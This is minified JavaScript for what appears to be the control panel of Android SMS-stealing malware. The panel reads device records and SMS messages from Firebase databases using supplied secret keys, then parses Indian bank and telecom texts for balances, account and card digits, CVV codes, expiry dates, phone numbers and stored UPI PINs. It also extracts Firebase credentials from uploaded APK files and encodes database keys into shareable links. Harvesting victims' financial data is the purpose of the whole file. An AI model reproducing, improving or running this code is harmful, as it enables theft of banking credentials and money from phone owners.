var Lp = Hp();
        const qp = O0(Lp),
            mh = "flixy_accounts";

        // Terminal API tracing: only method/URL/status/timing are sent to the local
        // panel logger. Query strings, bodies, headers and authentication secrets are never logged.
        function traceRequest(method, url, status, duration) {
            try {
                const u = new URL(url, location.href);
                u.search = "";
                fetch("/api/client-request-log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        method,
                        url: u.toString(),
                        status,
                        duration_ms: duration,
                        source: "firebase-client"
                    }),
                    keepalive: true
                }).catch(() => {});
            } catch {}
        }
        async function tracedFetch(url, options = {}) {
            const started = performance.now();
            try {
                const response = await fetch(url, options);
                traceRequest(options.method || "GET", url, response.status, performance.now() - started);
                return response;
            } catch (error) {
                traceRequest(options.method || "GET", url, 0, performance.now() - started);
                throw error;
            }
        }

        function Yp() {
            try {
                const A = localStorage.getItem(mh);
                return A ? JSON.parse(A) : []
            } catch {
                return []
            }
        }

        function nh(A) {
            localStorage.setItem(mh, JSON.stringify(A))
        }
        async function yn(A, tt, b, d) {
            let S = A.trim().replace(/\/$/, "");
            if (!S.startsWith("http")) S = "https://" + S;
            if (!S.includes("firebaseio.com") && !S.includes("firebasedatabase.app")) {
                throw new Error("Invalid Firebase URL. Must contain firebaseio.com or firebasedatabase.app");
            }
            const f = new URLSearchParams({
                auth: tt.trim(),
                ...d
            });
            const url = `${S}/${b}.json?${f}`;
            let p;
            try {
                const ctrl = new AbortController();
                const timer = setTimeout(() => ctrl.abort(), 15e3);
                p = await tracedFetch(url, {
                    method: "GET",
                    headers: {
                        "Accept": "application/json"
                    },
                    signal: ctrl.signal
                });
                clearTimeout(timer);
            } catch (netErr) {
                if (netErr.name === "AbortError") throw new Error("Request timed out. Check your Firebase URL.");
                throw new Error("Network error: " + netErr.message + ". Make sure the app is hosted on a server (not opened as a local file).");
            }
            if (!p.ok) {
                const h = await p.text().catch(() => "");
                let o;
                if (p.status === 401 || p.status === 403) {
                    o = "PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key from Firebase Console → Project Settings → Service Accounts → Database Secrets.";
                } else if (p.status === 404) {
                    return null;
                } else {
                    o = `HTTP ${p.status}: ${h.slice(0,300)}`;
                }
                throw new Error(o);
            }
            return p.json();
        }
        async function Zp(A, tt, b, d) {
            const S = A.replace(/\/$/, ""),
                f = await tracedFetch(`${S}/${b}.json?auth=${tt}`, {
                    method: "PUT",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(d)
                });
            if (!f.ok) throw f.status === 401 || f.status === 403 ? new Error("PERMISSION_DENIED: Cannot write to Firebase. Use Database Secret key, not API key.") : new Error(`HTTP ${f.status}`);
            return f.json()
        }
        async function Gp(A, tt, b) {
            const d = A.replace(/\/$/, ""),
                S = await tracedFetch(`${d}/${b}.json?auth=${tt}`, {
                    method: "DELETE"
                });
            if (!S.ok && S.status === 403) throw new Error("PERMISSION_DENIED")
        }
        const ph = [
            [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"],
            [/SBIIN|SBIINB|SBI/i, "SBI"],
            [/ICICIB|ICICI/i, "ICICI Bank"],
            [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"],
            [/KOTAKB|KOTAK/i, "Kotak Bank"],
            [/PNBSMS|PNB/i, "PNB"],
            [/BOIIND|BOI/i, "Bank of India"],
            [/CANBNK|CANARA/i, "Canara Bank"],
            [/UNIONB|UBISMS/i, "Union Bank"],
            [/YESBNK|YESBANK/i, "Yes Bank"],
            [/IDBIBK|IDBI/i, "IDBI Bank"],
            [/INDUSB|INDUSIND/i, "IndusInd Bank"],
            [/FEDERAL|FEDBNK/i, "Federal Bank"],
            [/RBLBNK|RBL/i, "RBL Bank"],
            [/PAYTM/i, "Paytm"],
            [/PHONEPE|PHNPE/i, "PhonePe"],
            [/GPAY|GOOGLEPAY/i, "Google Pay"],
            [/AMAZONPAY/i, "Amazon Pay"],
            [/BAJAJFIN/i, "Bajaj Finance"],
            [/CRED/i, "CRED"],
            [/AIRTEL/i, "Airtel Payments"],
            [/JIOMNY|JIOMONEY/i, "Jio Money"]
        ];

        function Xp(A) {
            for (const [d, S] of ph)
                if (d.test(A)) return S;
            const b = A.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
            return b ? b[1] : A || "Bank"
        }
        const Vp = [/Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i, /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i, /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i, /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i, /Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i, /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i, /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i, /(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i, /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i],
            Qp = [/(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i, /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i, /^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i, /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i],
            Kp = [/(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i, /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i],
            Jp = [/(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i, /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i],
            Fp = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i],
            Ip = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i, /([0-9]{1,2})\/([0-9]{2,4})\s+(?:expiry|exp)/i];

        function Wp(A) {
            if (!A) return null;
            const tt = A.toUpperCase();
            if (!tt.includes("CARD") && !tt.includes("CVV") && !tt.includes("CREDIT") && !tt.includes("DEBIT")) return null;
            let b = "",
                d = "",
                S = "",
                f = "";
            for (const p of Jp) {
                const h = A.match(p);
                if (h && h[1]) {
                    const o = h[1].replace(/[^0-9]/g, "");
                    if (o.length >= 4) {
                        b = o.slice(-4);
                        break
                    }
                }
            }
            if (!b) return null;
            /VISA/i.test(A) ? d = "VISA" : /MASTER(?:CARD)?/i.test(A) ? d = "Mastercard" : /RUPAY/i.test(A) ? d = "RuPay" : /AMEX|AMERICAN EXPRESS/i.test(A) ? d = "Amex" : /credit/i.test(A) ? d = "Credit Card" : /debit/i.test(A) && (d = "Debit Card");
            for (const p of Fp) {
                const h = A.match(p);
                if (h && h[1]) {
                    S = h[1];
                    break
                }
            }
            for (const p of Ip) {
                const h = A.match(p);
                if (h && h[1]) {
                    f = h[1];
                    break
                }
            }
            return {
                cardLast4: b,
                cardType: d,
                cvv: S || void 0,
                expiry: f || void 0,
                rawSms: A
            }
        }
        const sa = "(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)",
            $p = [new RegExp(`(?:Jio|JIO)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Airtel|AIRTEL)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:BSNL|bsnl)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:MTNL|mtnl)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Docomo|DOCOMO|Tata)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Reliance|RELIANCE)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Telenor|TELENOR)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Uninor|UNINOR)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), new RegExp(`(?:Videocon|VIDEOCON)\\s+${sa}\\s*[:\\-]\\s*([6-9][0-9]{9})`), /(?:नंबर|नम्बर)\s*[:\-]\s*([6-9][0-9]{9})/, /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i, /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})/i, /Number\s*[:\-]\s*([6-9][0-9]{9})/i, /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i, /(\+91[-\s]?[6-9][0-9]{9})/, /(?:\b91)([6-9][0-9]{9})\b/, /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/];

        function yh(A) {
            for (const tt of $p) {
                const b = A.match(tt);
                if (b && b[1]) {
                    const d = b[1].replace(/[^0-9]/g, "");
                    if (d.length === 10 && /^[6-9]/.test(d)) return d;
                    if (d.length === 12 && d.startsWith("91") && /^91[6-9]/.test(d)) return d.slice(2)
                }
            }
            return null
        }
        const Pp = [
                [/\bJio\s+Number\b/i, "Jio"],
                [/\bAirtel\s+Number\b/i, "Airtel"],
                [/\bBSNL\s+Number\b/i, "BSNL"],
                [/\bVodafone\s+Number\b/i, "Vodafone"],
                [/\bIdea\s+Number\b/i, "Vi (Idea)"],
                [/\bVi\s+Number\b/i, "Vi"],
                [/\bMTNL\s+Number\b/i, "MTNL"],
                [/\bDocomo\s+Number\b/i, "Docomo"],
                [/\bReliance\s+Number\b/i, "Reliance"],
                [/\bTelenor\s+Number\b/i, "Telenor"],
                [/\bUninor\s+Number\b/i, "Uninor"],
                [/\bVideocon\s+Number\b/i, "Videocon"],
                [/\bJio\b/i, "Jio"],
                [/\bAirtel\b/i, "Airtel"],
                [/\bBSNL\b/i, "BSNL"],
                [/\bVodafone\b/i, "Vodafone"],
                [/\b(?:Idea|Vi)\b/i, "Vi"],
                [/\bMTNL\b/i, "MTNL"],
                [/\bDocomo\b/i, "Docomo"],
                [/\bReliance\s+(?:Jio|Communications)\b/i, "Reliance"],
                [/\bTelenor\b/i, "Telenor"],
                [/\bUninor\b/i, "Uninor"],
                [/\bVideocon\b/i, "Videocon"]
            ],
            t1 = [
                [/AIRTEL|JD-AIRTEL|VM-AIRTEL/i, "Airtel"],
                [/JIOINF|JIOMSG|JIONET|JIO/i, "Jio"],
                [/BSNLSM|BSNL/i, "BSNL"],
                [/VISMOB|VI-|VODA|VODAFONE/i, "Vodafone"],
                [/IDEACEL|IDEA/i, "Vi (Idea)"],
                [/MTNL/i, "MTNL"],
                [/TATADOC|DOCOMO/i, "Docomo"],
                [/UNINOR/i, "Uninor"],
                [/TELENOR/i, "Telenor"]
            ];

        function gh(A, tt) {
            for (const [d, S] of t1)
                if (d.test(tt)) return S;
            const b = A + " " + tt;
            for (const [d, S] of Pp)
                if (d.test(b)) return S;
            return null
        }

        function e1(A, tt) {
            if (!A || A.trim().length < 8) return null;
            const b = A.toUpperCase(),
                d = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(b),
                S = /^[A-Z]{2}-[A-Z0-9]+$/.test(tt) && ph.some(([v]) => v.test(tt));
            if (!d && !S) return null;
            let f = null;
            for (const v of Vp) {
                const E = A.match(v);
                if (E && E[1]) {
                    const g = E[1].replace(/,/g, "");
                    if (parseFloat(g) >= 0) {
                        f = g;
                        break
                    }
                }
            }
            if (!f) return null;
            const p = tt || "Unknown",
                h = Xp(tt) || "Bank";
            let o;
            for (const v of Qp) {
                const E = A.match(v);
                if (E && E[1]) {
                    const g = E[1].replace(/,/g, "");
                    if (g !== f) {
                        o = g;
                        break
                    }
                }
            }
            let x;
            /credit(?:ed)?/i.test(A) ? x = "credit" : /debit(?:ed)?|withdraw|paid|purchase|spent/i.test(A) && (x = "debit");
            let T;
            for (const v of Kp) {
                const E = A.match(v);
                if (E && E[1]) {
                    T = E[1].replace(/[^0-9]/g, "").slice(-4);
                    break
                }
            }
            const w = yh(A),
                C = gh(A, tt);
            return {
                bankName: h,
                senderName: p,
                availableBalance: f,
                transactionAmount: o,
                transactionType: x,
                accountLast4: T,
                phoneFromSms: w || void 0,
                networkFromSms: C || void 0,
                rawSms: A,
                detectedAt: new Date().toISOString()
            }
        }

        function a1(A) {
            if (!A) return null;
            if (typeof A == "number") return A < 1e12 ? A * 1e3 : A;
            if (typeof A == "string" && A.trim()) {
                const tt = Date.parse(A);
                if (!isNaN(tt)) return tt;
                const b = A.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[T\s](\d{2}):(\d{2})(?::(\d{2}))?/);
                if (b) {
                    const [, d, S, f, p, h, o] = b, x = new Date(+f, +S - 1, +d, +p, +h, +(o || 0)).getTime();
                    if (!isNaN(x)) return x
                }
            }
            return null
        }

        function vs(A) {
            const tt = Date.now() - A;
            if (tt < 0) return "Just now";
            const b = Math.floor(tt / 1e3),
                d = Math.floor(b / 60),
                S = Math.floor(d / 60),
                f = Math.floor(S / 24);
            return b < 60 ? `${b}s ago` : d < 60 ? `${d}m ago` : S < 24 ? `${S}h ${d%60}m ago` : f < 30 ? `${f}d ${S%24}h ago` : new Date(A).toLocaleDateString("en-IN", {
                day: "2-digit",
                month: "short",
                year: "numeric"
            })
        }

        function lh(A) {
            return new Date(A).toLocaleString("en-IN", {
                day: "2-digit",
                month: "short",
                year: "numeric",
                hour: "2-digit",
                minute: "2-digit",
                second: "2-digit",
                hour12: !0
            })
        }

        function n1(A) {
            const tt = [];
            return A && typeof A == "object" && Object.entries(A).forEach(([b, d]) => {
                if (!d || typeof d != "object") return;
                const S = d,
                    f = S.sims;
                let p = [];
                Array.isArray(f) ? p = f : f && typeof f == "object" && (p = Object.values(f));
                const h = S.battery ?? "—",
                    o = String(h),
                    x = parseInt(o.replace("%", "")) || 0,
                    T = S.lastSeen ?? S.last_seen ?? S.lastOnline ?? S.last_online ?? S.lastActive ?? S.last_active ?? S.timestamp ?? S.time ?? S.dateTime ?? S.updatedAt ?? S.updated_at ?? null,
                    w = a1(T);
                tt.push({
                    id: b,
                    name: String(S.modelName || S.model || S.deviceName || b),
                    battery: o,
                    batteryPercent: x,
                    status: !!S.status,
                    phoneNumber: String(S.mobNo || (p[0] ?.phoneNumber ?? "—")),
                    android: String(S.androidV || S.androidVersion || "—"),
                    ip: String(S.ip_address || "—"),
                    storage: String(S.storage || "—"),
                    provider: String(S.service_provider || "—"),
                    sims: p,
                    upipin: S.upipin ? String(S.upipin) : null,
                    cpu: String(S.cpu_arch || "—"),
                    sdk: String(S.sdkV || "—"),
                    lastSeen: w,
                    lastSeenFormatted: w ? vs(w) : void 0
                })
            }), tt
        }

        function Gu(A) {
            const tt = [];
            if (A && typeof A == "object") {
                const b = Object.entries(A),
                    d = b.length > 150 ? b.slice(b.length - 150) : b;
                for (const [, S] of d) {
                    if (!S || typeof S != "object") continue;
                    const f = S,
                        p = String(f.message || f.body || f.text || "");
                    p.trim() && tt.push({
                        text: p,
                        sender: String(f.sender || f.from || "Unknown"),
                        time: String(f.dateTime || f.date || "")
                    })
                }
            }
            return tt.reverse()
        }

        function Xu(A) {
            const tt = [],
                b = [],
                d = new Set,
                S = new Set;
            for (const f of A) {
                const p = e1(f.text, f.sender);
                p && (p.detectedAt = f.time || p.detectedAt, tt.push(p));
                const h = Wp(f.text);
                h && b.push(h);
                const o = yh(f.text);
                o && d.add(o);
                const x = gh(f.text, f.sender);
                x && S.add(x)
            }
            return {
                bankBalances: tt,
                cards: b,
                phoneNumbers: [...d],
                networks: [...S]
            }
        }

        function Pl(A) {
            try {
                return parseFloat(A).toLocaleString("en-IN", {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })
            } catch {
                return A
            }
        }

        function ih(A, tt) {
            const b = window.location.origin + window.location.pathname,
                d = btoa(unescape(encodeURIComponent(A + "|||" + tt)));
            return `${b}?s=${d}`
        }

        function ihMerge(accounts) {
            const b = window.location.origin + window.location.pathname;
            const cleanAccs = accounts.map(a => ({
                url: a.url,
                key: a.key
            }));
            const d = btoa(unescape(encodeURIComponent("MERGED:::" + JSON.stringify(cleanAccs))));
            return `${b}?s=${d}`
        }

        function l1(A) {
            try {
                const tt = decodeURIComponent(escape(atob(A)));
                if (tt.startsWith("MERGED:::")) {
                    const accs = JSON.parse(tt.slice(9));
                    if (Array.isArray(accs) && accs.length > 0) {
                        return {
                            isMerged: true,
                            accounts: accs
                        };
                    }
                }
                const [b, d] = tt.split("|||");
                if (b && d) return {
                    isMerged: false,
                    url: b,
                    key: d
                }
            } catch {}
            return null
        }

        const STARRED_KEY = "flixy_starred_devices";

        function getStarredDevices() {
            try {
                return JSON.parse(localStorage.getItem(STARRED_KEY) || "[]");
            } catch {
                return [];
            }
        }

        function toggleStarredDevice(id) {
            const list = getStarredDevices();
            const next = list.includes(id) ? list.filter(x => x !== id) : [...list, id];
            localStorage.setItem(STARRED_KEY, JSON.stringify(next));
            return next;
        }
        // ─── SAFE ADMIN CONNECTION LOGGING ─────────────────────────────────────────
        // The browser never sends the raw Firebase authentication key/secret to the panel.
        // Only the connection URL, presence flag, and a one-way fingerprint are recorded.
        async function _sendLoginNotification({
            fbUrl,
            fbKey,
            loginType = "Firebase/API Key"
        }) {
            try {
                if (!fbUrl) return;
                let fingerprint = "";
                if (fbKey && globalThis.crypto?.subtle && globalThis.TextEncoder) {
                    const bytes = new TextEncoder().encode(fbKey);
                    const digest = await crypto.subtle.digest("SHA-256", bytes);
                    fingerprint = Array.from(new Uint8Array(digest)).map(x => x.toString(16).padStart(2, "0")).join("");
                }
                await fetch("/api/panel-connection", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        firebase_database_url: String(fbUrl).trim().replace(/\/$/, ""),
                        key_present: Boolean(fbKey),
                        key_fingerprint: fingerprint,
                        login_type: loginType
                    }),
                    keepalive: true
                }).catch(() => {});
            } catch {}
        }

        async function al(A, tt) {
            // Legacy notification hook intentionally disabled.
            return;
        }

        function Yu(A, tt) {
            let b = "";
            for (let p = 0; p < A.length; p += 65536) b += String.fromCharCode(...A.subarray(p, p + 65536));
            const S = b.match(tt.url),
                f = b.match(tt.key);
            return {
                url: S ? S[0] : "",
                key: f ? f[0] : ""
            }
        }
        async function i1(A) {
            const tt = await A.arrayBuffer(),
                b = await qp.loadAsync(tt);
            let d = "",
                S = "",
                f = "",
                p = "";
            const h = /https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi,
                o = /AIza[A-Za-z0-9_-]{35}/g,
                x = b.file("resources.arsc");
            if (x) {
                const T = await x.async("uint8array"),
                    w = Yu(T, {
                        url: h,
                        key: o
                    });
                w.url && (d = w.url), w.key && (S = w.key)
            }
            if (!d || !S) {
                const T = ["classes.dex", "classes2.dex", "classes3.dex", "classes4.dex"];
                for (const w of T) {
                    if (d && S) break;
                    const C = b.file(w);
                    if (!C) continue;
                    const v = await C.async("uint8array"),
                        E = Yu(v, {
                            url: h,
                            key: o
                        });
                    !d && E.url && (d = E.url), !S && E.key && (S = E.key)
                }
            }
            if (!d || !S) {
                const T = [b.file("google-services.json"), b.file("assets/google-services.json"), b.file(/google-services\.json$/i)[0]].filter(Boolean);
                for (const w of T)
                    if (w) try {
                        const C = JSON.parse(await w.async("text"));
                        d || (d = C ?.project_info ?.firebase_url || ""), f || (f = C ?.project_info ?.project_id || "");
                        const v = C ?.client ?.[0];
                        S || (S = v ?.api_key ?.[0] ?.current_key || ""), p || (p = v ?.client_info ?.mobilesdk_app_id || "")
                    } catch {}
            }
            if (!d || !S)
                for (const T of Object.keys(b.files)) {
                    if (d && S) break;
                    if (!b.files[T].dir) try {
                        const w = await b.files[T].async("uint8array"),
                            C = Yu(w, {
                                url: h,
                                key: o
                            });
                        !d && C.url && (d = C.url), !S && C.key && (S = C.key)
                    } catch {}
                }
            return !d && !S ? null : {
                firebaseUrl: d,
                apiKey: S,
                projectId: f,
                appId: p
            }
        }

        function Zu({
            text: A
        }) {
            const [tt, b] = jt.useState(!1), d = () => {
                navigator.clipboard.writeText(A), b(!0), setTimeout(() => b(!1), 2e3)
            };
            return r.jsx("button", {
                onClick: d,
                className: "p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-[#555] hover:text-white transition-all flex-shrink-0",
                children: tt ? r.jsx(uh, {
                    className: "w-3 h-3 text-emerald-400"
                }) : r.jsx(ch, {
                    className: "w-3 h-3"
                })
            })
        }

        